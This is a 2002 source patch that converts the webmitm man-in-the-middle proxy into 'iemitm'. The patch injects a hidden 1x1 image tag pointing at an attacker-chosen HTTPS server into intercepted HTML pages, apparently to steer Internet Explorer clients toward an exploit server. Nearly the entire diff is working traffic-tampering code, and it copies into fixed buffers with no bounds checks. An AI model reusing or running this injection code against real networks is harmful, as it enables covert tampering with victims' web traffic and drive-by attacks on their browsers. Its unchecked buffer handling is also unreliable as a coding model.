@@ -1,0 +1,234 @@
+--- webmitm.c	Thu Jan 17 18:08:30 2002
++++ iemitm.c	Fri Feb  1 20:56:14 2002
+@@ -1,11 +1,13 @@
+ /*
+- * webmitm.c
++ * iemitm.c
+  *
+  * HTTP / HTTPS monkey-in-the-middle.
+  *
+  * Copyright (c) 2000 Dug Song <dugsong@monkey.org>
+  *
+- * $Id: webmitm.c,v 1.11 2001/03/17 08:35:05 dugsong Exp $
++ * with mods by Peter Burkholder, 2002: Please excuse
++ *      my lousy C coding.
++ *
+  */
+ 
+ #include "config.h"
+@@ -31,13 +33,17 @@
+ #include "record.h"
+ #include "version.h"
+ 
+-#define CERT_FILE	"webmitm.crt"
++#define CERT_FILE	"iemitm.crt"
++#define IMG1		"<img src=\"https://"
++#define IMG2    	"/nogif.gif\" width=1 height=1>"
+ 
+ int	 Opt_quiet = 0;
+ int	 Opt_debug = 0;
+ int	 Opt_read = 0;
+ int	 Opt_write = 0;
+ int	 Opt_dns = 1;
++int	 Opt_insert= 0;
++char	 *ie_expl;
+ 
+ int	 http_fd, https_fd;
+ int	 client_fd, server_fd;
+@@ -53,7 +59,7 @@
+ usage(void)
+ {
+ 	fprintf(stderr, "Version: " VERSION "\n"
+-		"Usage: webmitm [-d] [host]\n");
++		"Usage: iemitm [-d] [-i server] [host]\n");
+ 	exit(1);
+ }
+ 
+@@ -66,6 +72,7 @@
+ }
+ 
+ static void
++
+ sig_int(int signal)
+ {
+ 	close(http_fd);
+@@ -195,16 +202,148 @@
+ 	return (reqlen);
+ }
+ 
++
+ static int
+-client_write(char *buf, int size)
++client_write(char *buf, int size) {
++     
++    int  osize;
++    char obuf[8192];
++    
++    if (do_ssl) {
++	return (SSL_write(ssl_client, buf, size));
++    }
++    if (ie_expl) {
++	// returned size will be greater if recoded
++	if ((osize = recode_http(buf, size, obuf, sizeof(obuf))) > size ) {
++	    return (write(client_fd, obuf, osize));
++	}
++    }
++    return (write(client_fd, buf, size));
++}
++
++/* ------------------------------------------------------- */
++
++int
++recode_http(u_char *buf, int len, u_char *obuf, int olen)
+ {
+-	if (do_ssl) {
+-		return (SSL_write(ssl_client, buf, size));
++	struct buf *msg, inbuf, outbuf, tmpbuf;
++	char *p, *q, *head, *text;
++	char tbuf[8192], tmpstr[10];			// local copy to munge
++	char img[128] = IMG1;
++	int i, j, cl_len, cl_off, istext, imglen, length, headlength;
++
++	strcat(img, ie_expl);
++	strcat(img, IMG2);
++
++	imglen=strlen(img);
++
++	// copy buf to tbuf
++	for (i=0; i<len; i++) {
++	    tbuf[i]=buf[i];
+ 	}
+-	warnx("client_write");
+-	return (write(client_fd, buf, size));
++
++	buf_init(&tmpbuf, tbuf, len);		// struct tmpbuf uses copy of input buffer
++	buf_init(&outbuf, obuf, olen);		//
++
++	while ((i = buf_index(&tmpbuf, "\r\n\r\n", 4)) >= 0) { // find end of http header
++		msg = buf_tok(&tmpbuf, NULL, i);		// return the stringy thing from inbuf up to 
++							// (i or NULL) to msg
++		msg->base[msg->end] = '\0';		// make sure it's a string by changing to /0
++		buf_skip(&tmpbuf, 4);			// skip ahead on inbuf to end of header
++
++		// strtok replace delim char with \0
++
++		if ((head = strtok(buf_ptr(msg), "\r\n")) == NULL)  //if no \r\n, then done parsing; continue 
++		    						    //this will replace \r with \0 in msg
++		    						    // head points to start of header
++			continue;
++
++		if (strncmp(head, "HTTP/1.1 200 OK", 15) != 0 &&
++		    strncmp(head, "HTTP/1.0 200 OK", 15) != 0)
++		        continue;
++
++		istext = length = 0;
++		
++		while ((p = strtok(NULL, "\r\n")) != NULL) {
++		    if (strncasecmp(p, "Content-type: ", 14) == 0) {
++		        if (strncasecmp(p + 14, "text/html", 9) == 0) 
++			    istext = 1;
++		    } else if (strncasecmp(p, "Content-length: ", 16) == 0) {
++			p += 16;
++			length = atoi(p);		// atoi conv. stops at non-digit
++			cl_off = p-head;
++			cl_len = strspn(p, "0123456789");
++
++			// Now is the right time to copy msg over to obuf
++			// copy into obuf[0] to obuf[cl_off]
++			for (i=0; i<cl_off; i++) 
++			    obuf[i] = buf[i];
++			j = i + cl_len;
++			sprintf(tmpstr, "%d", length+imglen);
++			for (p=tmpstr; *p; p++) 
++			    *(obuf + i++) = *p;
++	
++			while (j < msg->end) 
++			    *(obuf + i++) = *(buf + j++);
++
++			headlength=i;
++
++			warnx("HEADER REWRITTEN, %d is length", headlength);
++		    }
++		}
++
++		if ( istext && !length) {
++		    for (i=0; i < msg->end; i++)
++			obuf[i]=buf[i];
++
++		    headlength=i;
++
++		    warnx("HEADER not REWRITTEN, %d is length", headlength);
++		}
++
++		sprintf(tmpstr, "\r\n\r\n");
++		for (p=tmpstr; *p; p++) 
++		    *(obuf + headlength++) = *p;
++
++
++		if ( istext ) { 		// now we can search for <body in text
++		    warnx("istext");
++		    if ((msg = buf_tok(&tmpbuf, NULL, len)) == NULL)
++		        continue;
++		    msg->base[msg->end] = '\0';
++		    text = buf_ptr(msg);
++
++
++		    if ( (p = strstr(text, "<BODY")) || 
++			 (p = strstr(text, "<body"))) {
++			if ( p = strchr(p, '>') ) {
++			    warnx("body tag match");
++			    p++;		// move past '>'
++			    q = text;
++			    while ( q < p )
++				obuf[headlength++] = *(q++);
++			    for (p = img; *p; p++) 
++				*(obuf + headlength++) = *p;
++			    while (*q) {
++				obuf[headlength++] = *(q++);
++			    }
++			    warnx("len: %d, headlength: %d", len, headlength);
++		            //for (i=0; i<headlength; i++)
++		             //   putchar(obuf[i]);
++			    return(headlength);
++			} else {
++			    warnx("no closing body tag match");
++			}
++		    } else {
++			warnx("no opening body tag match");
++		    }
++		}
++	}
++
++	return(len); 	// do nothing
+ }
+ 
++/* ------------------------------------------------------- */
+ static void
+ client_close(void)
+ {
+@@ -417,7 +556,7 @@
+ 			if (Opt_debug > 2)
+ 				write(STDERR_FILENO, buf, i);
+ 			
+-			if (client_write(buf, i) != i)
++			if (client_write(buf, i) < i)
+ 				break;
+ 		}
+ 		else err(1, "select");
+@@ -498,10 +637,15 @@
+ 	extern int optind;
+ 	int c;
+ 
+-	while ((c = getopt(argc, argv, "dh?V")) != -1) {
++	ie_expl = NULL;
++
++	while ((c = getopt(argc, argv, "i:dh?V")) != -1) {
+ 		switch (c) {
+ 		case 'd':
+ 			Opt_debug++;
++			break;
++		case 'i':
++			ie_expl = optarg;
+ 			break;
+ 		default:
+ 			usage();
